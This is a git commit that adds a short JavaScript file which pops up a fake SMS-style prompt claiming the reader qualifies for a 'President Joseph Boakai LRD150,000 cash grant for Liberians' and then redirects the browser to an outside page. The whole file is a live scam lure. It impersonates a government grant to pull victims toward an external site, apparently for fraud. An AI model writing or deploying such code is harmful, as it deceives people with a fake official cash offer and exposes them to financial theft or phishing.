f3392e4b4431eb00c2ba13d8d0481446b8ba27b4
boss-bloq <nsisboy01@gmail.com>
2024-11-15 20:32:33 -0800

    Create liberian-active.js

---
+++ liberian-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW LRD150,000'
+password=prompt('SMS: Congratulations You are qualify for President JOSEPH BOAKAI LRD150,000 CASH GRANT FOR LIBERIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW LRD150,000');
+if (password != 'WITHDRAW LRD150,000') {
+location.href='https://damba-fest.org/liberia-grant.html';
+}
